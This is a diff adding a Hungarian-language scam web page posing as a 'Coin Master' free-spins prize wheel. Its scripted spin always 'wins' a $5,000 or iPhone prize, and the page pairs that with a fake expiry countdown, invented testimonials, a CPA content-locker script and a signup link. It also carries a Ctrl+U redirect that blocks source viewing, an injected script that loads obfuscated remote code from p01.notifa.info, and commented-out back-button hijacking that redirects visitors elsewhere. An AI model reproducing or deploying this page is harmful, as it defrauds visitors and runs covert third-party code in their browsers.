@@ -1,0 +1,363 @@
+<!DOCTYPE html><html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <base #href="">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-site-verification" content="U-8Lk2imxaP-KT1dKkLXb2MwPod4oLW6p4BVWZZEkM0" />
+  <title>(1) ?? Jutalom a függőben lévő ingyenes pörgetésekért</title>
+
+  <!--<link rel="stylesheet" type="text/css" href="https://pin.coinmasterz.com/prizewheel/sweetalert.css">
+  <link rel="stylesheet" type="text/css" href="https://pin.coinmasterz.com/prizewheel/styles.css">
+  <link rel="stylesheet" type="text/css" href="https://pin.coinmasterz.com/prizewheel/animate.css">
+  <link rel="stylesheet" type="text/css" href="https://pin.coinmasterz.com/prizewheel/walmart/walmart.css">
+  <script src="https://pin.coinmasterz.com/prizewheel/jquery.js" type="text/javascript"></script>
+  -->
+
+  <link rel="stylesheet" type="text/css" href="https://coin-master.xyz/resources/css/sweetalert.css">
+  <link rel="stylesheet" type="text/css" href="https://coin-master.xyz/resources/css/styles.css">
+  <link rel="stylesheet" type="text/css" href="https://coin-master.xyz/resources/css/animate.css">
+  <link rel="stylesheet" type="text/css" href="https://coin-master.xyz/resources/css/walmart.css">
+  <script src="https://coin-master.xyz/resources/js/jquery.js" type="text/javascript"></script>
+
+  <link rel="png" href="https://coin-master.xyz/resources/img/favicon.png">
+  
+  <script type="text/javascript">
+    var CPABUILDSETTINGS={"it":704377,"key":"33dc2"};
+</script>
+<script src="https://cpabuild.com/public/external/locker.js"></script>
+</head>
+<body>
+<script type="text/javascript">
+  var dayNames = new Array("Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");  var monthNames = new Array("January", " February", " March", " April", " May", " June", " July", " August", " September", " October", " November", " December");
+  var now = new Date();
+  var today= monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();
+  function get_date(days){  
+    return today = monthNames[now.getMonth()] + " " + (now.getDate() - days);
+  }
+  function get_day(days){  
+    return today = dayNames[now.getDay()];
+  }
+</script>
+<div id="a-nav">
+  <h1> Request free spins </h1>
+</div>
+<main>
+  <div class="content">
+    <div class="main-content" id="content1">
+      <center>
+         <p class="title-small"> Gratulálunk!</p>
+         <p style="color:#797979;"> Every <script type="text/javascript">
+              document.write(get_day(0));
+        
+            </script> 100 szerencsés embert választottam, akik különleges díjakat kapnak. Forgasd meg a kereket, hogy megkapd a különleges díjat.</p>
+      </center>
+<div class="offerlst">
+<div style="text-align: center;">
+<span style="font-family: Arial; font-size: 18px;"> Gratulálunk! Ön ma szerencsés ember - <b>
+<script language="javascript" type="text/javascript">// <![CDATA[
+
+var today_date= new Date()
+var month=today_date.getMonth()
+var today=today_date.getDate()
+var year=today_date.getFullYear()
+
+var months = new Array(
+" január",
+"február",
+" március",
+" április",
+" Lehet",
+" június",
+" július",
+" augusztus",
+" szeptember",
+" október",
+" November",
+" December");
+//
+// ]]></script>
+<script language="javascript" type="text/javascript">// <![CDATA[
+
+document.write(months[month]+" "+today+", "+year)
+//
+// ]]></script>
+</b> </span></div>
+<div style="text-align: center;">
+</div>
+<center><span style="color: #FFA500; font-size: 30px;"><b> A különleges események forgatják a tribute oldalt </b></span></center> 
+      <div id="spinner">
+        <img id="spinBG" src="https://coin-master.xyz/resources/img/11.png">
+        <img id="spin" src="https://pbs.twimg.com/media/EY3oKUWU4AAg-xU?format=png&name=900x900">
+        <img onclick="" id="win" src="https://coin-master.xyz/resources/img/spin-button.png">
+        <img id="iphone" class="animated rotateIn" src="https://pbs.twimg.com/media/EYUTm71UwAApxvq?format=png&name=small">
+        
+      </div>  
+      <span style="display: block; text-align: center;"><img alt="#" border="0" src="https://pbs.twimg.com/media/EZcAZ77U0AACa8n?format=jpg&name=small" style="width: 100%; height: 100%;" /></span>                           
+      </div>                  
+    </div>        
+</main>
+<div class="sweet-overlay" tabindex="-1" style="opacity: 1.03; display: block;"></div>
+<div id="modal01" class="sweet-alert animated bounceIn visible">
+  <!--<img src="win.png" alt="">-->
+   <div style="padding: 16px; text:black;"> <h2> Gratulálunk, most kérjen ingyenes pörgetést!</h2>
+  <p attr-cou="default"><font color="black"><strong> Szeretnénk megköszönni szolgáltatásaink folyamatos támogatását, ezért lehetőséget kínálunk Önnek exkluzív díj átvételére </strong></font><br><br><img src="https://pbs.twimg.com/media/EY3tF5wUEAAJZqH?format=png&name=900x900" alt="Trulli" width="100%" height="90">
+    <font color="black"><strong>Kattintson a "díj igénylésére ??</strong></font"><br><br><strong><font color="red"> Sok szerencsét!</font></strong></p>
+  <p attr-cou="es"></p></div>
+  <div class="sa-button-container">
+    <div class="sa-confirm-button-container">
+        <button onclick="hidemodal01()" style="display: inline-block; "> FORGÁS</button>
+
+<!-- Header12 -->
+<!-- Global site tag (gtag.js) - Google Analytics
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162276107-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-162276107-1');
+</script> -->   
+
+        
+  <div class="la-ball-fall"></div>
+</div>
+  </div>
+</div>
+<div id="modal02" class="sweet-alert animated bounceIn">
+  <div id="success02" class="sa-icon sa-success">
+    <span id="successtip02" class="sa-line sa-tip"></span>
+    <span id="successlong02" class="sa-line sa-long"></span>
+    <div class="sa-placeholder"></div>
+    <div class="sa-fix"></div>
+  </div>
+    <h2> Try again!</h2>
+    <p style="margin-bottom: 22px;"> you have <strong>(1)</strong> extra spin!</p>
+  <div class="sa-button-container">
+    <div class="sa-confirm-button-container">
+        <button onclick="hidemodal02()" style="display: inline-block; ">OK</button>
+        <div class="la-ball-fall"></div>
+    </div>
+  </div>
+</div>
+<div id="modal03" class="sweet-alert animated bounceIn">
+  <div id="success03" class="sa-icon sa-success">
+    <span id="successtio03" class="sa-line sa-tip"></span>
+    <span id="successlong03" class="sa-line sa-long"></span>
+    <div class="sa-placeholder"></div>
+    <div class="sa-fix"></div>
+  </div>
+  <div style="padding: 0px 16px 32px 16px;">
+  <h2> Gratulálunk!</h2>
+      <p><strong>$ 5,000</strong> az Ön számára fenntartva!</p><p> A díj igényléséhez kattintson az alábbi gombra, és ellenőrizze a következő oldalon található információkat.</p>
+      
+      <script type="text/javascript">function countDown () {
+            var minsTag = $('#mins');
+            var hsecsTag = $('#hsecs');
+            var minVal = Number(minsTag.html());
+            var secVal = Number(hsecsTag.html());
+            setInterval(function() {
+                secVal = secVal - 1;
+                if (secVal < 0 && minVal > 0) {
+                    secVal = 59;
+                    minVal -= 1
+                    if (minVal < 0) {
+                        minVal = 0;
+                    }
+                } else if (secVal < 0 && minVal <= 0) {
+                    secVal = 0;
+                }
+                minsTag.html(minVal);
+                hsecsTag.html(secVal);
+            }, 1000);
+          }</script>
+      <p></p>
+      
+        <a style="display: inline-block; background-color: #8BC34A;font-size: 18px; padding: 18px 44px" href="https://kyojuro99.xyz/signup.php" > Kérjen ajándékot most </a>
+<div class="timer" style="margin-top:5px;margin-left:5px">
+          <p> Your prize will expire in <span style="color:red;font-weight: 600;"><span id="mins">5</span>:<span id="hsecs">30</span></span></p>
+        </div>
+        <div class="la-ball-fall"></div>
+    </div>  
+</div>
+<script>
+ function hidemodal01(){
+
+    $('#modal01').removeClass('visible');
+    $('.sweet-overlay').css('display','none');
+    $('#spin').addClass('spinAround');
+    setTimeout(function () {
+        $('#modal02').addClass('visible');
+        $('.sweet-overlay').css('display','block');
+        setTimeout(function () {
+          $('#success02').addClass('animate');
+          $('#successtip02').addClass('animateSuccessTip');
+          $('#successlong02').addClass('animateSuccessLong');
+        }, 500);
+    }, 7500);
+  }
+  function hidemodal02(){
+    $('#modal02').removeClass('visible');
+    $('.sweet-overlay').css('display','none');
+    $('#spin').addClass('spinAround2');
+    setTimeout(function () {
+        $('#iphone').css('display','block');
+    }, 7000);
+    setTimeout(function () {
+        $('#modal03').addClass('visible');
+        $('.sweet-overlay').css('display','block');
+        setTimeout(function () {
+          $('#success03').addClass('animate');
+          $('#successtip03').addClass('animateSuccessTip');
+          $('#successlong03').addClass('animateSuccessLong');
+        }, 500);
+    }, 8000);
+  }
+</script> 
+<script type="text/javascript" defer="">
+setInterval('countdown()',1000);
+function countdown(){
+  var mins = parseInt(document.getElementById("mins").innerHTML);
+  var secs = parseInt(document.getElementById("hsecs").innerHTML);
+  if(mins!=0 && secs==0){
+    nmins = mins -1; nsecs = 59;
+  }
+  else if(mins!=0 || secs!=0){
+    nmins = mins; nsecs = secs - 1;
+  }
+  else if(mins==0 && secs==0){
+    nmins = mins; nsecs = secs;
+  }
+  document.getElementById("mins").innerHTML = nmins;
+  document.getElementById("hsecs").innerHTML = nsecs;
+  if(nsecs < 10) nsecs = "0" + nsecs;
+  document.getElementById("hsecs").innerHTML = nsecs;
+}
+</script>
+
+<div class="content">
+      <div class="main-content2" style="background: #f3f3f3;">
+        <p style="text-align: center;">
+        </p><div class="comments" style="color: #3b5898;">
+          <p style="margin: 0px; padding: 0px; " id="total_likes">
+            <i class="icon-commenting"></i>
+              <span class="like" style="font-size: 14px;">98,239</span> <span style="font-size: 13px; color:#8e8e8e;">people like this</span>
+          </p>
+        </div><!--/.comments-->
+        <div class="comments ">
+            <span style="color: #3b5898; font-size: 15px; ">View Comments</span>
+            <span style="color: #9E9E9E; text-align: right; float: right; font-size: 15px;">80,971</span>
+          <div style="clear: both;"></div>
+        </div><!--/.comments-->
+        <div class="comments">
+            <div class="comment-content pic2">
+            <p class="name">Alis Femal</p>
+            <p class="comentarios"> Soha nem nyertem semmit, de ma szerencsém volt, mert 5000 dollárt kaptam! Köszönöm!</p> 
+            <span class="comment-status">
+            <span>
+                <span class="like">Like</span>&middot; Válasz &middot; Pont most
+              <i class="icon-thumbs-up"></i>
+            </span>
+          </span>
+          </div><!--/.comments-content pic1-->
+          <div class="clr"></div>
+        </div><!--/.comment-->
+        <div class="comments">
+          <div class="comment-content pic1">
+            <p class="name">Alexi Ba</p>
+            <p class="comentarios"> Eleinte nem tudtam, valódi-e vagy sem, de megkaptam az iPhone 11 pro max ajándékot, és megérkeztem az otthonomba, köszönöm !!</p>
+              <span class="comment-status">
+            <span>
+                <span class="like">Like</span>&middot; Válasz &middot; 2 perce
+              <i class="icon-thumbs-up"></i>
+            </span>
+          </span>
+          </div><!--/.comments-content pic2-->
+          <div class="clr"></div>
+        </div><!--/.comments-->
+        <div class="comments">
+          <div class="comment-content pic3">
+            <p class="name">Mike Hines</p>
+            <p class="comentarios"> At first I thought this was just a joke, but the gift went through the mail this morning and got a macbook!<br></p>
+              <span class="comment-status">
+            <span>
+                <span class="like">Like</span>&middot; Válasz &middot; 4 perccel ezelőtt
+              <i class="icon-thumbs-up"></i>
+            </span>
+          </span>
+          </div><!--/.comments-content pic3-->
+          <div class="clr"></div>
+        </div><!--/.comment-->
+        <div class="comments">
+          <div class="comment-content pic4">
+            <p class="name">Sandra Moore</p>
+            <p class="comentarios"> Sweeeet! I've won $ 5B! My gosh!</p> 
+            <span class="comment-status">
+            <span>
+                <span class="like">Like</span>&middot; Válasz &middot; 8 perccel ezelőtt
+              <i class="icon-thumbs-up"></i>
+            </span>
+          </span>
+          </div><!--/.comments-content pic4-->
+          <div class="clr"></div>
+        </div><!--/.comments-->
+        <div class="comments">
+          <div class="comment-content pic5">
+            <p class="name">Tom Rise</p>
+            <p class="comentarios">Kezdetben 1 ingyenes pörgetést kapok, és végül 5000 dollárt kapok, köszönöm <br></p>
+              <span class="comment-status">
+            <span>
+                <span class="like">Like</span>&middot; Válasz &middot; 11 perccel ezelőtt
+              <i class="icon-thumbs-up"></i>
+            </span>
+          </span>
+          </div><!--/.comments-content pic5-->
+          <div class="clr"></div>
+          <!--/.comment-status-->
+        </div><!--/.coments-->
+      </div>
+    </div>  
+    <script type="text/javascript">
+//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="https://pbs.twimg.com/profile_images/378800000721836614/b98d95ee2aadd34150c9188c202eb8d6.jpeg"});
+//]]>
+</script>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2ZeSHSlatGFX1jqKjYrRWfAtjL9ggCBZz2xOivk1EbgqZ47537yUQU5jvU5VwqO%2bEVIbtC3zpBcuKyj4Tyb1HelXJXq4mp7%2fqsY7%2fmmEurEgZRK4yFSZYF6CRVmhZ2BbOW3QJN6U1kWP8zTn%2fv3F0KvThKmSo03OplYvlUCHjXewaquH%2baQRgY9yyJuAAlsCCcY3xFZhPAXsMHlWxClRZNaxBabBnvE2IMaR3gLiGxut3n6a7nt0u6qaPHqmuz35zayIby3zuETRbLzCLTezxiG8col5AKj1h6cwn4E6ynM8AF4m1fCXsIndlP9qqy2z%2bKI8GmUsKUta4KrSVphIgHZJhFqRl2QFPFo7bTWRDtyZyemDH8eYelgJGZzn2nRZI3R3R%2buQoxjNDLGO3RcU1DIyGGPegYRYhR2q9bJF1%2f%2bWvzZy69VK8M8N7%2fz%2b21aMEYUkQoMXKH3Kkq1uRWwzq54uE1Tnhr2x6koUrBR4kkCMc%2bCuRaBqn4L2iN60BmM7H1YnJGMDLD%2bGhcb%2fjaeT1c3HYegV%2bcOCCRucL68erz5M%3d "+ "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<!--  
+<script type="text/javascript">var tu="https://cbldc.io/e078b15";if(function(t,r){"function"==typeof define&&define.amd?define(["exports"],r):"object"==typeof exports?(r(exports),"object"==typeof module&&null!==module&&(module.exports=exports=exports.uri)):r(t.lil=t.lil||{})}(this,function(t){"use strict";var r=/^(?:([^:\/?#]+):\/\/)?((?:([^\/?#@]*)@)?([^\/?#:]*)(?:\:(\d*))?)?([^?#]*)(?:\?([^#]*))?(?:#((?:.|\n)*))?/i;function o(t){return"string"==typeof t}function e(t){return decodeURIComponent(escape(t))}function n(t){var r={};if("string"==typeof t)return t.split("&").forEach(function(t){t=t.split("="),r.hasOwnProperty(t[0])?(r[t[0]]=Array.isArray(r[t[0]])?r[t[0]]:[r[t[0]]],r[t[0]].push(t[1])):r[t[0]]=t[1]}),r}function u(t){return function(r){return r?(this.parts[t]=o(r)?e(r):r,this):(this.parts=this.parse(this.build()),this.parts[t])}}function s(t){this.uri=t||null,o(t)&&t.length?this.parts=this.parse(t):this.parts={}}function i(t){return new s(t)}return s.prototype.parse=function(t){var o=e(t||"").match(r),u=(o[3]||"").split(":"),s=u.length?(o[2]||"").replace(/(.*\@)/,""):o[2];return{uri:o[0],protocol:o[1],host:s,hostname:o[4],port:o[5],auth:o[3],user:u[0],password:u[1],path:o[6],search:o[7],query:n(o[7]),hash:o[8]}},s.prototype.protocol=function(t){return u("protocol").call(this,t)},s.prototype.host=function(t){return u("host").call(this,t)},s.prototype.hostname=function(t){return u("hostname").call(this,t)},s.prototype.port=function(t){return u("port").call(this,t)},s.prototype.auth=function(t){return u("host").call(this,t)},s.prototype.user=function(t){return u("user").call(this,t)},s.prototype.password=function(t){return u("password").call(this,t)},s.prototype.path=function(t){return u("path").call(this,t)},s.prototype.search=function(t){return u("search").call(this,t)},s.prototype.query=function(t){return t&&"object"==typeof t?u("query").call(this,t):this.parts.query},s.prototype.hash=function(t){return u("hash").call(this,t)},s.prototype.get=function(t){return this.parts[t]||""},s.prototype.build=s.prototype.toString=s.prototype.valueOf=function(){var t=this.parts,r=[];return t.protocol&&r.push(t.protocol+"://"),t.auth?r.push(t.auth+"@"):t.user&&r.push(t.user+(t.password?":"+t.password:"")+"@"),t.host?r.push(t.host):(t.hostname&&r.push(t.hostname),t.port&&r.push(":"+t.port)),t.path&&r.push(t.path),t.query&&"object"==typeof t.query?(t.path||r.push("https://pin.coinmasterz.com/"),r.push("?"+Object.keys(t.query).map(function(r){return Array.isArray(t.query[r])?t.query[r].map(function(t){return r+(t?"="+t:"")}).join("&"):r+(t.query[r]?"="+t.query[r]:"")}).join("&"))):t.search&&r.push("?"+t.search),t.hash&&(t.path||r.push("https://pin.coinmasterz.com/"),r.push("#"+t.hash)),this.url=r.filter(function(t){return o(t)}).join("")},i.VERSION="0.2.2",i.is=i.isURL=function(t){return"string"==typeof t&&r.test(t)},i.URI=s,t.uri=i}),location.search){var queryString=(currentUrl=lil.uri(location.href)).search(),outputOrigUrl=lil.uri(tu),outputOrigQuery=outputOrigUrl.search(),sep=null!=outputOrigQuery&&outputOrigQuery.length>0?"&":"?";null!=queryString&&""!=queryString&&(tu=outputOrigUrl+sep+queryString)}var currentUrl=location.origin+location.pathname+location.search;"#!/hst"!==location.hash&&(history.replaceState(null,document.title,currentUrl+"#!/hst"),history.pushState(null,document.title,currentUrl)),window.addEventListener("popstate",function(){"#!/hst"===location.hash&&setTimeout(function(){window.location.replace(tu)},0)},!1);for(var anchors=document.getElementsByTagName("a"),i=0;i<anchors.length;i++)anchors[i].href=tu;</script>
+<script>
+        (function (window, location) {
+            var redirect = "https://cbldc.io/39e4592";
+            if (location.search) {
+                var url = lil.uri(location.href);
+                var queryString = url.search();
+                var outputOrigUrl = lil.uri(redirect);
+                var outputOrigQuery = outputOrigUrl.search();
+                var sep = outputOrigQuery != undefined && outputOrigQuery.length > 0 ? '&' : '?';
+                if (queryString != undefined && queryString != '') {
+                    redirect = outputOrigUrl + sep + queryString;
+                }
+            }
+            var currentUrl = location.origin + location.pathname + location.search;
+            if (location.hash !== "#!/hst") {
+                history.replaceState(null, document.title, currentUrl + "#!/hst");
+                history.pushState(null, document.title, currentUrl);
+            }
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/hst") {
+                    setTimeout(function () {
+                        window.location.replace(redirect);
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+    </script>
+--></body></html>
